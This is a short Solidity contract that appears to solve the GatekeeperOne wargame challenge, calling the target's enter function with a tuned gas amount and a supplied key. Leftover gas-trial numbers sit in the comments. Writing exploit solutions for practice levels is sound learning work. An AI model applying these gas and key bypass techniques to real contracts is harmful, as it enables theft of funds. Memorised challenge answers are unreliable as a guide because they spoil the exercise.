// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GK1Break {
    address payable gk1 = 0x5Cb3892D04C1Aa6B30Efb4470Eb2B7F2dE39d04a;

    // constructor(address payable _gk1) public payable {
    //     gk1 = _gk1;
    // }

    //8498, 9536, 785, 253, 8504, 8554 - 8604 //// 8558 /// 59 /// 8445 // 16636
    //bytes8 _key
    function enterGK1(bytes8 _key) public payable {
        GatekeeperOne(gk1).enter.gas(24827)(_key);
    }

    // receive() external payable {
    //     require(msg.sender == 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
    // }
}
